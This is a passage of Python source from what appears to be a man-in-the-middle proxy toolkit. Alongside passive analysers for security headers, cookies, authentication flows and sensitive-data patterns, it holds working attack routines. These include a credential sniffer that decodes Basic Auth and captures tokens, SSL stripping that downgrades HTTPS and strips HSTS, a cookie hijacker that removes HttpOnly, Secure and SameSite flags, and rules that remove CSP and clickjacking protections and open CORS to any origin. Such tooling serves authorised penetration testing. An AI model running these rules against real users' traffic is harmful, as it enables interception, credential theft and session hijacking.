        result: ToolExecutionResult
    ) -> ToolExecutionResult:
        """Execute credential sniffer on captured traffic"""
        traffic = proxy.traffic_log[-100:]  # Recent traffic
        
        credentials_found = []
        
        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            
            # Check headers
            headers = getattr(req, 'headers', {}) if hasattr(req, 'headers') else req.get('headers', {})
            
            # Basic Auth
            auth = headers.get('Authorization', '')
            if auth.startswith('Basic '):
                try:
                    import base64
                    import binascii
                    decoded = base64.b64decode(auth[6:]).decode()
                    if ':' in decoded:
                        user, passwd = decoded.split(':', 1)
                        credentials_found.append({
                            "type": "basic_auth",
                            "username": user,
                            "password": passwd[:4] + "****",  # Redact
                            "endpoint": getattr(req, 'path', 'unknown')
                        })
                except (binascii.Error, UnicodeDecodeError, ValueError):
                    pass  # Invalid base64 or encoding
            
            # Bearer Token
            if auth.startswith('Bearer '):
                token = auth[7:]
                credentials_found.append({
                    "type": "bearer_token",
                    "token": token[:20] + "..." if len(token) > 20 else token,
                    "endpoint": getattr(req, 'path', 'unknown')
                })
            
            # API Keys
            for key in ['X-API-Key', 'X-Auth-Token', 'Api-Key']:
                if key in headers:
                    credentials_found.append({
                        "type": "api_key",
                        "header": key,
                        "value": headers[key][:10] + "...",
                        "endpoint": getattr(req, 'path', 'unknown')
                    })
        
        result.success = True
        result.credentials_found = credentials_found
        
        if credentials_found:
            result.findings.append({
                "severity": "critical",
                "category": "credential_exposure",
                "title": f"Credentials Captured: {len(credentials_found)} instances",
                "description": f"The credential sniffer captured {len(credentials_found)} authentication credentials from intercepted traffic.",
                "evidence": json.dumps(credentials_found[:5], indent=2),
                "recommendation": "Implement proper encryption and avoid sending credentials in headers"
            })
        else:
            result.findings.append({
                "severity": "info",
                "category": "credential_exposure",
                "title": "No Credentials Captured",
                "description": "No authentication credentials were found in the captured traffic."
            })
        
        return result
    
    async def _execute_header_analyzer(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult
    ) -> ToolExecutionResult:
        """Analyze security headers in traffic"""
        traffic = proxy.traffic_log[-50:]
        
        header_analysis = {
            "missing": set(),
            "present": set(),
            "weak": []
        }
        
        security_headers = [
            "Content-Security-Policy",
            "Strict-Transport-Security",
            "X-Content-Type-Options",
            "X-Frame-Options",
            "X-XSS-Protection",
            "Referrer-Policy",
            "Permissions-Policy"
        ]
        
        for entry in traffic:
            resp = entry.response if hasattr(entry, 'response') else None
            if not resp:
                continue
            
            headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else {}
            
            for sh in security_headers:
                if sh in headers or sh.lower() in [h.lower() for h in headers]:
                    header_analysis["present"].add(sh)
                else:
                    header_analysis["missing"].add(sh)
        
        result.success = True
        
        missing = list(header_analysis["missing"] - header_analysis["present"])
        if missing:
            result.findings.append({
                "severity": "medium",
                "category": "security_headers",
                "title": f"Missing Security Headers: {len(missing)} headers",
                "description": f"The following security headers are missing from responses: {', '.join(missing)}",
                "evidence": f"Missing: {missing}",
                "recommendation": "Add the missing security headers to improve application security"
            })
        
        if header_analysis["present"]:
            result.findings.append({
                "severity": "info",
                "category": "security_headers",
                "title": f"Security Headers Present: {len(header_analysis['present'])}",
                "description": f"The following security headers are present: {', '.join(header_analysis['present'])}"
            })
        
        return result
    
    async def _execute_tech_fingerprint(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult
    ) -> ToolExecutionResult:
        """Fingerprint technologies from traffic"""
        traffic = proxy.traffic_log[-50:]
        
        technologies = set()
        
        for entry in traffic:
            resp = entry.response if hasattr(entry, 'response') else None
            if not resp:
                continue
            
            headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else {}
            
            if 'Server' in headers:
                technologies.add(f"Server: {headers['Server']}")
            if 'X-Powered-By' in headers:
                technologies.add(f"Framework: {headers['X-Powered-By']}")
            if 'X-AspNet-Version' in headers:
                technologies.add(f"ASP.NET: {headers['X-AspNet-Version']}")
        
        result.success = True

        if technologies:
            result.findings.append({
                "severity": "info",
                "category": "fingerprinting",
                "title": f"Technologies Identified: {len(technologies)}",
                "description": f"The following technologies were identified from traffic headers: {', '.join(technologies)}",
                "evidence": json.dumps(list(technologies), indent=2),
                "recommendation": "Consider hiding version information to prevent targeted attacks"
            })

        return result

    # ========================================================================
    # Passive Analysis Tools (LOW risk - no traffic modification)
    # ========================================================================

    async def _execute_traffic_analyzer(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult
    ) -> ToolExecutionResult:
        """Analyze traffic patterns without modifying anything."""
        traffic = proxy.traffic_log[-100:] if hasattr(proxy, 'traffic_log') else []

        endpoints = {}
        methods_used = set()
        content_types = set()
        auth_patterns = []
        sensitive_paths = []

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            resp = entry.response if hasattr(entry, 'response') else None

            method = getattr(req, 'method', '') if hasattr(req, 'method') else req.get('method', '')
            path = getattr(req, 'path', '') if hasattr(req, 'path') else req.get('path', '')
            headers = getattr(req, 'headers', {}) if hasattr(req, 'headers') else req.get('headers', {})

            if method:
                methods_used.add(method)

            # Track endpoints
            base_path = path.split('?')[0] if path else ''
            if base_path:
                if base_path not in endpoints:
                    endpoints[base_path] = {"methods": set(), "count": 0}
                endpoints[base_path]["methods"].add(method)
                endpoints[base_path]["count"] += 1

            # Check for auth
            if 'Authorization' in headers:
                auth_patterns.append({"path": path, "type": headers['Authorization'].split()[0] if headers['Authorization'] else 'unknown'})

            # Track response content types
            if resp:
                resp_headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else {}
                ct = resp_headers.get('Content-Type', '')
                if ct:
                    content_types.add(ct.split(';')[0])

            # Identify sensitive paths
            sensitive_keywords = ['admin', 'login', 'auth', 'user', 'account', 'password', 'api/v', 'token', 'session']
            if any(kw in path.lower() for kw in sensitive_keywords):
                sensitive_paths.append(path)

        result.success = True

        # Convert endpoints for JSON
        endpoint_list = [{"path": p, "methods": list(d["methods"]), "hits": d["count"]} for p, d in endpoints.items()]
        endpoint_list.sort(key=lambda x: x["hits"], reverse=True)

        result.findings.append({
            "severity": "info",
            "category": "traffic_analysis",
            "title": f"Traffic Analysis: {len(endpoint_list)} Endpoints Mapped",
            "description": f"Analyzed {len(traffic)} requests. Found {len(endpoint_list)} unique endpoints using {len(methods_used)} HTTP methods.",
            "evidence": json.dumps({
                "total_requests": len(traffic),
                "unique_endpoints": len(endpoint_list),
                "methods": list(methods_used),
                "content_types": list(content_types),
                "top_endpoints": endpoint_list[:10]
            }, indent=2)
        })

        if sensitive_paths:
            result.findings.append({
                "severity": "medium",
                "category": "traffic_analysis",
                "title": f"Found {len(set(sensitive_paths))} Sensitive Endpoints",
                "description": "Endpoints that may handle authentication or sensitive data.",
                "evidence": json.dumps(list(set(sensitive_paths))[:15], indent=2)
            })

        if auth_patterns:
            result.findings.append({
                "severity": "info",
                "category": "traffic_analysis",
                "title": f"Authentication Patterns Detected",
                "description": f"Found {len(auth_patterns)} authenticated requests.",
                "evidence": json.dumps(auth_patterns[:10], indent=2)
            })

        return result

    async def _execute_cookie_analyzer(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult
    ) -> ToolExecutionResult:
        """Passively analyze cookie security without modifying traffic."""
        traffic = proxy.traffic_log[-100:] if hasattr(proxy, 'traffic_log') else []

        cookies_analyzed = {}
        security_issues = []

        for entry in traffic:
            resp = entry.response if hasattr(entry, 'response') else None
            if not resp:
                continue

            headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else {}
            set_cookie = headers.get('Set-Cookie', '')

            if set_cookie:
                # Parse cookie
                parts = set_cookie.split(';')
                if parts:
                    cookie_main = parts[0].strip()
                    cookie_name = cookie_main.split('=')[0] if '=' in cookie_main else 'unknown'

                    cookie_lower = set_cookie.lower()
                    issues = []

                    if 'httponly' not in cookie_lower:
                        issues.append("Missing HttpOnly - accessible via JavaScript")
                    if 'secure' not in cookie_lower:
                        issues.append("Missing Secure - sent over HTTP")
                    if 'samesite' not in cookie_lower:
                        issues.append("Missing SameSite - CSRF vulnerable")
                    elif 'samesite=none' in cookie_lower and 'secure' not in cookie_lower:
                        issues.append("SameSite=None without Secure flag")

                    cookies_analyzed[cookie_name] = {
                        "has_httponly": 'httponly' in cookie_lower,
                        "has_secure": 'secure' in cookie_lower,
                        "has_samesite": 'samesite' in cookie_lower,
                        "issues": issues
                    }

                    if issues:
                        security_issues.append({"cookie": cookie_name, "issues": issues})

        result.success = True

        result.findings.append({
            "severity": "info",
            "category": "cookie_analysis",
            "title": f"Analyzed {len(cookies_analyzed)} Cookies",
            "description": "Passive analysis of cookie security attributes.",
            "evidence": json.dumps(cookies_analyzed, indent=2)
        })

        if security_issues:
            result.findings.append({
                "severity": "high",
                "category": "cookie_security",
                "title": f"Found {len(security_issues)} Cookies with Security Issues",
                "description": "These cookies are missing recommended security flags.",
                "evidence": json.dumps(security_issues, indent=2),
                "recommendation": "Add HttpOnly, Secure, and SameSite flags to session cookies"
            })

        return result

    async def _execute_auth_flow_analyzer(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult
    ) -> ToolExecutionResult:
        """Passively analyze authentication flows."""
        traffic = proxy.traffic_log[-100:] if hasattr(proxy, 'traffic_log') else []

        auth_mechanisms = set()
        jwt_tokens = []
        oauth_indicators = []
        session_tokens = []

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            resp = entry.response if hasattr(entry, 'response') else None

            path = getattr(req, 'path', '') if hasattr(req, 'path') else req.get('path', '')
            headers = getattr(req, 'headers', {}) if hasattr(req, 'headers') else req.get('headers', {})

            # Check Authorization header
            auth = headers.get('Authorization', '')
            if auth:
                if auth.startswith('Basic'):
                    auth_mechanisms.add('HTTP Basic Auth')
                elif auth.startswith('Bearer'):
                    auth_mechanisms.add('Bearer Token')
                    token = auth[7:]
                    if token.count('.') == 2:  # JWT
                        auth_mechanisms.add('JWT')
                        jwt_tokens.append({"path": path, "token_preview": token[:50] + "..."})
                elif 'apikey' in auth.lower():
                    auth_mechanisms.add('API Key')

            # Check for OAuth patterns
            oauth_keywords = ['oauth', 'authorize', 'callback', 'token', 'client_id', 'redirect_uri']
            if any(kw in path.lower() for kw in oauth_keywords):
                oauth_indicators.append(path)
                auth_mechanisms.add('OAuth')

            # Check cookies for session tokens
            cookies = headers.get('Cookie', '')
            session_keywords = ['session', 'sid', 'token', 'auth']
            for cookie in cookies.split(';'):
                cookie_name = cookie.split('=')[0].strip().lower() if '=' in cookie else ''
                if any(kw in cookie_name for kw in session_keywords):
                    session_tokens.append(cookie_name)
                    auth_mechanisms.add('Session Cookie')

        result.success = True

        result.findings.append({
            "severity": "info",
            "category": "auth_analysis",
            "title": f"Identified {len(auth_mechanisms)} Authentication Mechanisms",
            "description": "Passive analysis of authentication patterns in traffic.",
            "evidence": json.dumps({
                "mechanisms": list(auth_mechanisms),
                "jwt_tokens_found": len(jwt_tokens),
                "oauth_endpoints": list(set(oauth_indicators))[:10],
                "session_cookies": list(set(session_tokens))[:10]
            }, indent=2)
        })

        if jwt_tokens:
            result.findings.append({
                "severity": "medium",
                "category": "auth_analysis",
                "title": f"Found {len(jwt_tokens)} JWT Tokens",
                "description": "JWT tokens detected in traffic - analyze for algorithm weaknesses.",
                "evidence": json.dumps(jwt_tokens[:5], indent=2)
            })

        return result

    async def _execute_sensitive_data_scanner(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult
    ) -> ToolExecutionResult:
        """Scan traffic for sensitive data patterns."""
        import re

        traffic = proxy.traffic_log[-100:] if hasattr(proxy, 'traffic_log') else []

        findings_list = []

        # Patterns for sensitive data
        patterns = {
            "email": r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            "credit_card": r'\b(?:\d{4}[-\s]?){3}\d{4}\b',
            "ssn": r'\b\d{3}-\d{2}-\d{4}\b',
            "api_key": r'(?:api[_-]?key|apikey)["\s:=]+["\']?([a-zA-Z0-9_-]{20,})',
            "aws_key": r'(?:AKIA|ABIA|ACCA|ASIA)[A-Z0-9]{16}',
            "private_key": r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----',
            "password_field": r'(?:password|passwd|pwd)["\s:=]+["\']?([^"\'&\s]{4,})',
            "bearer_token": r'Bearer\s+([a-zA-Z0-9_-]+\.?){2,}',
        }

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            resp = entry.response if hasattr(entry, 'response') else None

            path = getattr(req, 'path', '') if hasattr(req, 'path') else req.get('path', '')
            req_body = getattr(req, 'body_text', '') if hasattr(req, 'body_text') else req.get('body_text', '')
            resp_body = ''
            if resp:
                resp_body = getattr(resp, 'body_text', '') if hasattr(resp, 'body_text') else ''

            # Scan request and response bodies
            for pattern_name, pattern in patterns.items():
                # Scan request
                if req_body:
                    matches = re.findall(pattern, req_body, re.IGNORECASE)
                    if matches:
                        findings_list.append({
                            "type": pattern_name,
                            "location": "request_body",
                            "path": path,
                            "count": len(matches)
                        })

                # Scan response
                if resp_body:
                    matches = re.findall(pattern, resp_body, re.IGNORECASE)
                    if matches:
                        findings_list.append({
                            "type": pattern_name,
                            "location": "response_body",
                            "path": path,
                            "count": len(matches)
                        })

        result.success = True

        if findings_list:
            # Group by type
            by_type = {}
            for f in findings_list:
                t = f["type"]
                if t not in by_type:
                    by_type[t] = []
                by_type[t].append(f)

            result.findings.append({
                "severity": "high",
                "category": "sensitive_data",
                "title": f"Found {len(findings_list)} Sensitive Data Exposures",
                "description": "Sensitive data patterns detected in traffic.",
                "evidence": json.dumps({
                    "summary": {k: len(v) for k, v in by_type.items()},
                    "details": findings_list[:20]
                }, indent=2),
                "recommendation": "Review and ensure sensitive data is properly protected"
            })
        else:
            result.findings.append({
                "severity": "info",
                "category": "sensitive_data",
                "title": "No Obvious Sensitive Data Patterns",
                "description": "No common sensitive data patterns (emails, cards, keys) found in sampled traffic."
            })

        return result

    # ========================================================================
    # SSL Stripping Attack Implementation
    # ========================================================================

    async def _execute_sslstrip(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute SSL Strip attack - downgrades HTTPS to HTTP.

        This attack:
        1. Rewrites all HTTPS links in responses to HTTP
        2. Strips HSTS headers to prevent browser enforcement
        3. Removes Secure flags from cookies
        4. Monitors for credentials sent over downgraded connections
        """
        rules_applied = []

        # Rule 1: Rewrite HTTPS links to HTTP in HTML responses
        link_rewrite_rule = {
            "name": "SSL Strip - Link Rewriter",
            "match_direction": "response",
            "match_content_type": "text/html",
            "action": "modify",
            "body_find_replace": {
                'https://': 'http://',
                'href="https://': 'href="http://',
                'src="https://': 'src="http://',
                'action="https://': 'action="http://',
                "href='https://": "href='http://",
                "src='https://": "src='http://",
                "action='https://": "action='http://",
            }
        }
        rule1 = self.mitm_service.add_rule(proxy_id, link_rewrite_rule)
        rules_applied.append(rule1)

        # Rule 2: Strip HSTS header
        hsts_strip_rule = {
            "name": "SSL Strip - HSTS Remover",
            "match_direction": "response",
            "action": "modify",
            "remove_headers": ["Strict-Transport-Security", "Public-Key-Pins", "Public-Key-Pins-Report-Only"]
        }
        rule2 = self.mitm_service.add_rule(proxy_id, hsts_strip_rule)
        rules_applied.append(rule2)

        # Rule 3: Strip Secure flag from cookies
        cookie_strip_rule = {
            "name": "SSL Strip - Cookie Secure Flag Remover",
            "match_direction": "response",
            "action": "modify",
            "body_find_replace_regex": True,
            "body_find_replace": {
                "; ?[Ss]ecure": "",
            }
        }
        rule3 = self.mitm_service.add_rule(proxy_id, cookie_strip_rule)
        rules_applied.append(rule3)

        # Analyze existing traffic for SSL strip opportunities
        traffic = proxy.traffic_log[-100:] if hasattr(proxy, 'traffic_log') else []
        https_links_found = 0
        hsts_headers_found = 0
        secure_cookies_found = 0

        for entry in traffic:
            resp = entry.response if hasattr(entry, 'response') else None
            if not resp:
                continue

            headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else {}
            body = getattr(resp, 'body_text', '') if hasattr(resp, 'body_text') else ''

            # Count HTTPS links
            if body:
                https_links_found += body.lower().count('https://')

            # Check for HSTS
            if 'Strict-Transport-Security' in headers or 'strict-transport-security' in [h.lower() for h in headers]:
                hsts_headers_found += 1

            # Check for Secure cookies
            set_cookie = headers.get('Set-Cookie', '')
            if 'secure' in set_cookie.lower():
                secure_cookies_found += 1

        result.success = True
        result.findings.append({
            "severity": "critical",
            "category": "ssl_stripping",
            "title": "SSL Strip Attack Active",
            "description": f"SSL stripping rules applied. {len(rules_applied)} rules active to downgrade HTTPS connections.",
            "evidence": json.dumps({
                "rules_applied": [r.get('rule_id') for r in rules_applied],
                "https_links_to_rewrite": https_links_found,
                "hsts_headers_to_strip": hsts_headers_found,
                "secure_cookies_to_strip": secure_cookies_found
            }, indent=2),
            "recommendation": "Monitor traffic for credentials sent over HTTP after downgrade",
            "attack_active": True
        })

        if https_links_found > 0:
            result.findings.append({
                "severity": "high",
                "category": "ssl_stripping",
                "title": f"Found {https_links_found} HTTPS Links to Downgrade",
                "description": "These HTTPS links will be rewritten to HTTP, potentially exposing credentials."
            })

        return result

    # ========================================================================
    # HSTS Bypass Implementation
    # ========================================================================

    async def _execute_hsts_bypass(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute HSTS Bypass - removes HSTS headers before browser caches them.

        Effective against:
        - First-time visitors (HSTS not yet cached)
        - Sites with short max-age values
        - Sites not in browser preload lists
        """
        # Apply the HSTS bypass rule
        if tool.rule_template:
            rule_result = self.mitm_service.add_rule(proxy_id, tool.rule_template)
        else:
            rule_result = self.mitm_service.add_rule(proxy_id, {
                "name": "HSTS Bypass - Header Remover",
                "match_direction": "response",
                "action": "modify",
                "remove_headers": [
                    "Strict-Transport-Security",
                    "Public-Key-Pins",
                    "Public-Key-Pins-Report-Only",
                    "Expect-CT"
                ]
            })

        # Analyze traffic for HSTS configurations
        traffic = proxy.traffic_log[-50:] if hasattr(proxy, 'traffic_log') else []
        hsts_configs = []

        for entry in traffic:
            resp = entry.response if hasattr(entry, 'response') else None
            if not resp:
                continue

            headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else {}
            hsts_value = headers.get('Strict-Transport-Security', '')

            if hsts_value:
                # Parse HSTS directives
                max_age = 0
                include_subdomains = False
                preload = False

                for directive in hsts_value.split(';'):
                    directive = directive.strip().lower()
                    if directive.startswith('max-age='):
                        try:
                            max_age = int(directive.split('=')[1])
                        except:
                            pass
                    elif directive == 'includesubdomains':
                        include_subdomains = True
                    elif directive == 'preload':
                        preload = True

                hsts_configs.append({
                    "max_age": max_age,
                    "max_age_days": max_age // 86400,
                    "include_subdomains": include_subdomains,
                    "preload": preload,
                    "bypassable": max_age < 31536000 and not preload  # Less than 1 year and not preloaded
                })

        result.success = True
        result.findings.append({
            "severity": "high",
            "category": "hsts_bypass",
            "title": "HSTS Bypass Rule Active",
            "description": "HSTS headers will be stripped from all responses, preventing browser HSTS caching.",
            "evidence": f"Rule ID: {rule_result.get('rule_id')}",
            "attack_active": True
        })

        if hsts_configs:
            bypassable = [c for c in hsts_configs if c.get('bypassable')]
            if bypassable:
                result.findings.append({
                    "severity": "high",
                    "category": "hsts_bypass",
                    "title": f"Found {len(bypassable)} Bypassable HSTS Configurations",
                    "description": f"HSTS configurations with short max-age or missing preload directive can be bypassed on first visit.",
                    "evidence": json.dumps(bypassable[:5], indent=2)
                })

        return result

    # ========================================================================
    # Cookie Hijacker Implementation
    # ========================================================================

    async def _execute_cookie_hijacker(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute Cookie Hijacker - captures session cookies and strips security flags.

        This attack:
        1. Captures all cookies from traffic
        2. Identifies cookies missing security flags
        3. Applies rules to strip HttpOnly, Secure, and SameSite flags
        4. Enables cookie theft via XSS or HTTP interception
        """
        # Apply cookie flag stripping rule
        cookie_strip_rule = {
            "name": "Cookie Hijacker - Flag Stripper",
            "match_direction": "response",
            "action": "modify",
            "body_find_replace_regex": True,
            "body_find_replace": {
                "; ?[Hh]ttp[Oo]nly": "",
                "; ?[Ss]ecure": "",
                "; ?[Ss]ame[Ss]ite=[Ss]trict": "",
                "; ?[Ss]ame[Ss]ite=[Ll]ax": "",
                "; ?[Ss]ame[Ss]ite=[Nn]one": "",
            }
        }
        rule_result = self.mitm_service.add_rule(proxy_id, cookie_strip_rule)

        # Analyze captured cookies
        traffic = proxy.traffic_log[-100:] if hasattr(proxy, 'traffic_log') else []
        captured_cookies = []
        vulnerable_cookies = []

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            resp = entry.response if hasattr(entry, 'response') else None

            req_headers = getattr(req, 'headers', {}) if hasattr(req, 'headers') else req.get('headers', {})

            # Capture cookies from requests
            cookie_header = req_headers.get('Cookie', '')
            if cookie_header:
                for cookie in cookie_header.split(';'):
                    cookie = cookie.strip()
                    if '=' in cookie:
                        name, value = cookie.split('=', 1)
                        captured_cookies.append({
                            "name": name.strip(),
                            "value": value[:20] + "..." if len(value) > 20 else value,
                            "path": getattr(req, 'path', 'unknown') if hasattr(req, 'path') else req.get('path', 'unknown')
                        })

            # Analyze Set-Cookie headers for vulnerabilities
            if resp:
                headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else {}
                set_cookie = headers.get('Set-Cookie', '')

                if set_cookie:
                    cookie_lower = set_cookie.lower()
                    issues = []

                    if 'httponly' not in cookie_lower:
                        issues.append("Missing HttpOnly - vulnerable to XSS cookie theft")
                    if 'secure' not in cookie_lower:
                        issues.append("Missing Secure - sent over HTTP")
                    if 'samesite' not in cookie_lower:
                        issues.append("Missing SameSite - vulnerable to CSRF")

                    if issues:
                        # Extract cookie name
                        cookie_name = set_cookie.split('=')[0] if '=' in set_cookie else 'unknown'
                        vulnerable_cookies.append({
                            "name": cookie_name,
                            "issues": issues,
                            "full_header": set_cookie[:100]
                        })

        result.success = True

        # Deduplicate captured cookies
        unique_cookies = {c['name']: c for c in captured_cookies}.values()

        result.findings.append({
            "severity": "high",
            "category": "session_hijacking",
            "title": f"Cookie Hijacker Active - {len(list(unique_cookies))} Cookies Captured",
            "description": "Session cookies captured and security flag stripping enabled.",
            "evidence": json.dumps({
                "rule_id": rule_result.get('rule_id'),
                "cookies_captured": list(unique_cookies)[:10],
                "total_captured": len(list(unique_cookies))
            }, indent=2),
            "attack_active": True
        })

        if vulnerable_cookies:
            result.findings.append({
                "severity": "critical",
                "category": "session_hijacking",
                "title": f"Found {len(vulnerable_cookies)} Vulnerable Cookies",
                "description": "These cookies are missing security flags and can be stolen or manipulated.",
                "evidence": json.dumps(vulnerable_cookies[:5], indent=2),
                "recommendation": "Add HttpOnly, Secure, and SameSite flags to all session cookies"
            })

        return result

    # ========================================================================
    # CSP Bypass Implementation
    # ========================================================================

    async def _execute_csp_bypass(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute CSP Bypass - removes Content-Security-Policy headers.

        Enables:
        - Inline script execution
        - External script loading from any domain
        - XSS attack exploitation
        """
        # Apply CSP removal rule
        csp_rule = {
            "name": "CSP Bypass - Header Stripper",
            "match_direction": "response",
            "action": "modify",
            "remove_headers": [
                "Content-Security-Policy",
                "Content-Security-Policy-Report-Only",
                "X-Content-Security-Policy",
                "X-WebKit-CSP"
            ]
        }
        rule_result = self.mitm_service.add_rule(proxy_id, csp_rule)

        # Analyze existing CSP configurations
        traffic = proxy.traffic_log[-50:] if hasattr(proxy, 'traffic_log') else []
        csp_configs = []

        for entry in traffic:
            resp = entry.response if hasattr(entry, 'response') else None
            if not resp:
                continue

            headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else {}
            csp_value = headers.get('Content-Security-Policy', '') or headers.get('content-security-policy', '')

            if csp_value:
                # Parse CSP directives
                directives = {}
                for directive in csp_value.split(';'):
                    directive = directive.strip()
                    if ' ' in directive:
                        name, values = directive.split(' ', 1)
                        directives[name] = values
                    elif directive:
                        directives[directive] = ''

                # Identify weaknesses
                weaknesses = []
                if "'unsafe-inline'" in csp_value:
                    weaknesses.append("Allows unsafe-inline scripts")
                if "'unsafe-eval'" in csp_value:
                    weaknesses.append("Allows unsafe-eval")
                if "data:" in csp_value:
                    weaknesses.append("Allows data: URIs")
                if "*" in directives.get("script-src", ""):
                    weaknesses.append("Wildcard in script-src")

                csp_configs.append({
                    "directives": list(directives.keys()),
                    "weaknesses": weaknesses,
                    "has_script_src": "script-src" in directives,
                    "has_default_src": "default-src" in directives
                })

        result.success = True
        result.findings.append({
            "severity": "high",
            "category": "csp_bypass",
            "title": "CSP Bypass Active - XSS Protection Disabled",
            "description": "Content-Security-Policy headers are being stripped from all responses.",
            "evidence": f"Rule ID: {rule_result.get('rule_id')}",
            "recommendation": "Inline scripts can now be injected; combine with script_injector tool",
            "attack_active": True
        })

        if csp_configs:
            result.findings.append({
                "severity": "medium",
                "category": "csp_bypass",
                "title": f"Analyzed {len(csp_configs)} CSP Configurations",
                "description": "CSP policies were present but are now bypassed.",
                "evidence": json.dumps(csp_configs[:3], indent=2)
            })

        return result

    # ========================================================================
    # CORS Manipulator Implementation
    # ========================================================================

    async def _execute_cors_manipulator(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute CORS Manipulator - opens CORS policy to allow cross-origin requests.

        Enables:
        - Cross-origin data theft
        - Authenticated requests from attacker domains
        - API access from malicious sites
        """
        # Apply permissive CORS rule
        cors_rule = {
            "name": "CORS Manipulator - Policy Opener",
            "match_direction": "response",
            "action": "modify",
            "modify_headers": {
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Methods": "GET, POST, PUT, DELETE, PATCH, OPTIONS",
                "Access-Control-Allow-Headers": "*",
                "Access-Control-Allow-Credentials": "true",
                "Access-Control-Max-Age": "86400",
                "Access-Control-Expose-Headers": "*"
            }
        }
        rule_result = self.mitm_service.add_rule(proxy_id, cors_rule)

        # Analyze existing CORS configurations
        traffic = proxy.traffic_log[-50:] if hasattr(proxy, 'traffic_log') else []
        cors_issues = []

        for entry in traffic:
            req = entry.request if hasattr(entry, 'request') else {}
            resp = entry.response if hasattr(entry, 'response') else None

            if not resp:
                continue

            req_headers = getattr(req, 'headers', {}) if hasattr(req, 'headers') else req.get('headers', {})
            resp_headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else {}

            origin = req_headers.get('Origin', '')
            acao = resp_headers.get('Access-Control-Allow-Origin', '')
            acac = resp_headers.get('Access-Control-Allow-Credentials', '')

            if acao:
                issues = []
                if acao == '*' and acac.lower() == 'true':
                    issues.append("Wildcard origin with credentials - CRITICAL misconfiguration")
                elif acao == origin and origin:
                    issues.append("Origin reflection - may allow arbitrary origins")
                elif acao == 'null':
                    issues.append("null origin allowed - can be exploited via sandboxed iframes")

                if issues:
                    cors_issues.append({
                        "path": getattr(req, 'path', 'unknown') if hasattr(req, 'path') else req.get('path', 'unknown'),
                        "acao": acao,
                        "acac": acac,
                        "issues": issues
                    })

        result.success = True
        result.findings.append({
            "severity": "high",
            "category": "cors_manipulation",
            "title": "CORS Policy Opened - Cross-Origin Access Enabled",
            "description": "All responses now have permissive CORS headers allowing any origin to access the API.",
            "evidence": f"Rule ID: {rule_result.get('rule_id')}",
            "recommendation": "Attacker can now steal data from authenticated sessions via malicious website",
            "attack_active": True
        })

        if cors_issues:
            result.findings.append({
                "severity": "critical",
                "category": "cors_manipulation",
                "title": f"Found {len(cors_issues)} Existing CORS Misconfigurations",
                "description": "These endpoints already had exploitable CORS configurations.",
                "evidence": json.dumps(cors_issues[:5], indent=2)
            })

        return result

    # ========================================================================
    # X-Frame Bypass (Clickjacking) Implementation
    # ========================================================================

    async def _execute_x_frame_bypass(
        self,
        proxy_id: str,
        proxy,
        result: ToolExecutionResult,
        tool: MITMAttackTool
    ) -> ToolExecutionResult:
        """
        Execute X-Frame Bypass - removes clickjacking protections.

        Enables:
        - Framing the application in attacker-controlled pages
        - Clickjacking attacks
        - UI redressing
        """
        # Apply X-Frame-Options removal rule
        xfo_rule = {
            "name": "Clickjacking Enabler - X-Frame Remover",
            "match_direction": "response",
            "match_content_type": "text/html",  # CSP meta tags only in HTML
            "action": "modify",
            "remove_headers": ["X-Frame-Options"],
            "body_find_replace": {
                "frame-ancestors 'self'": "frame-ancestors *",
                "frame-ancestors 'none'": "frame-ancestors *",
                'frame-ancestors "self"': "frame-ancestors *",
                'frame-ancestors "none"': "frame-ancestors *"
            }
        }
        rule_result = self.mitm_service.add_rule(proxy_id, xfo_rule)

        # Check current protections
        traffic = proxy.traffic_log[-50:] if hasattr(proxy, 'traffic_log') else []
        protections_found = {"x_frame_options": 0, "frame_ancestors": 0}

        for entry in traffic:
            resp = entry.response if hasattr(entry, 'response') else None
            if not resp:
                continue

            headers = getattr(resp, 'headers', {}) if hasattr(resp, 'headers') else {}
            body = getattr(resp, 'body_text', '') if hasattr(resp, 'body_text') else ''

            if 'X-Frame-Options' in headers:
                protections_found["x_frame_options"] += 1
            if 'frame-ancestors' in body.lower():
                protections_found["frame_ancestors"] += 1

        result.success = True
        result.findings.append({
            "severity": "medium",
            "category": "clickjacking",
            "title": "Clickjacking Protection Disabled",
            "description": "X-Frame-Options headers removed and frame-ancestors CSP modified to allow framing.",
            "evidence": json.dumps({
                "rule_id": rule_result.get('rule_id'),
                "protections_stripped": protections_found
            }, indent=2),
            "recommendation": "Application can now be embedded in malicious pages for clickjacking",
            "attack_active": True
        })

        return result

    # ========================================================================
